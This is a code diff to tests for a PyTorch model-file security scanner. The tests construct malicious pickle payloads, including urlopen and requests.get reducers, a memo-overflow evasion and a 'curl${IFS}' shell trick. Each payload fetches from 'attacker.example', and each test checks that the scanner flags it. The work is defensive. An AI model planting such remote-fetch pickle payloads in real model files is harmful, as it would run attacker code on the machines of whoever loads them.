@@ -11601,17 +11601,13 @@ def _pickle_short_binunicode_bytes(data: bytes) -> bytes:
     return b"\x8c" + bytes([len(data)]) + data
 
 
-def _short_binunicode(data: bytes) -> bytes:
-    return _pickle_short_binunicode(data)
-
-
 def _memo_overflow_urlopen_payload() -> bytes:
     overflow_index = _PYTORCH_LEGACY_MAX_TRACKED_MEMO_ENTRIES
     return (
         b"\x80\x04"
         + (b"N\x94" * overflow_index)
         + b"curllib.request\nurlopen\n"
-        + _short_binunicode(b"https://attacker.example/payload")
+        + _pickle_short_binunicode_bytes(b"https://attacker.example/payload")
         + b"\x940j"
         + overflow_index.to_bytes(4, "little")
         + b"\x85R."
@@ -11951,6 +11947,46 @@ def test_pytorch_zip_keeps_spaced_network_attribute_url_actionable(tmp_path: Pat
     )
 
 
+def test_pytorch_zip_keeps_shell_ifs_network_url_actionable(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "shell-ifs-network-code.pt", with_pickle=False, prefix="archive")
+    payload = pickle.dumps({"loader": "curl${IFS}https://attacker.example/payload"}, protocol=0)
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert any(
+        issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+        for issue in result.issues
+    )
+
+
+def test_pytorch_zip_preserves_same_offset_network_findings_per_member(tmp_path: Path) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "multi-member-network.pt", with_pickle=False, prefix="archive")
+    payload = pickle.dumps({"loader": "requests.get('https://attacker.example/payload')"}, protocol=0)
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+        zipf.writestr("archive/extra.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    explicit_url_issues = [
+        issue
+        for issue in result.issues
+        if issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+    ]
+    assert {issue.location for issue in explicit_url_issues} == {
+        f"{model_path}:archive/data.pkl",
+        f"{model_path}:archive/extra.pkl",
+    }
+
+
 def test_pytorch_zip_keeps_network_url_reducer_actionable(tmp_path: Path) -> None:
     model_path = create_mock_pytorch_zip(tmp_path / "network-reducer.pt", with_pickle=False, prefix="archive")
     payload = b"curllib.request\nurlopen\n(Vhttps://attacker.example/payload\ntR."
@@ -11965,6 +12001,31 @@ def test_pytorch_zip_keeps_network_url_reducer_actionable(tmp_path: Path) -> Non
         and issue.details.get("associated_global") == "urllib.request.urlopen"
         for issue in result.issues
     )
+    explicit_url_issues = [
+        issue
+        for issue in result.issues
+        if issue.rule_code == "S310"
+        and issue.severity == IssueSeverity.CRITICAL
+        and issue.details.get("type") == "explicit_network_pattern"
+        and issue.details.get("matched_text") == "https://attacker.example/payload"
+    ]
+    assert len(explicit_url_issues) == 1
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        b"c__main__\nRemoteLoader\n(Vhttps://attacker.example/payload\ntR.",
+        b"crequests\nget\n(Vhttps://attacker.example/payload\ntR.",
+    ],
+)
+def test_pytorch_zip_keeps_project_and_requests_url_reducers_actionable(tmp_path: Path, payload: bytes) -> None:
+    model_path = create_mock_pytorch_zip(tmp_path / "custom-network-reducer.pt", with_pickle=False, prefix="archive")
+    with zipfile.ZipFile(model_path, "a") as zipf:
+        zipf.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
     explicit_url_issues = [
         issue
         for issue in result.issues
@@ -12001,7 +12062,7 @@ def test_pytorch_zip_fails_closed_for_memo_overflow_url_reducer(tmp_path: Path) 
 
 def test_pytorch_zip_keeps_extension_reducer_url_evidence_actionable(tmp_path: Path) -> None:
     model_path = create_mock_pytorch_zip(tmp_path / "extension-url-reducer.pt", with_pickle=False, prefix="archive")
-    payload = b"\x80\x04\x82\x01" + _short_binunicode(b"https://attacker.example/payload") + b"\x85R."
+    payload = b"\x80\x04\x82\x01" + _pickle_short_binunicode_bytes(b"https://attacker.example/payload") + b"\x85R."
     with zipfile.ZipFile(model_path, "a") as zipf:
         zipf.writestr("archive/data.pkl", payload)
 
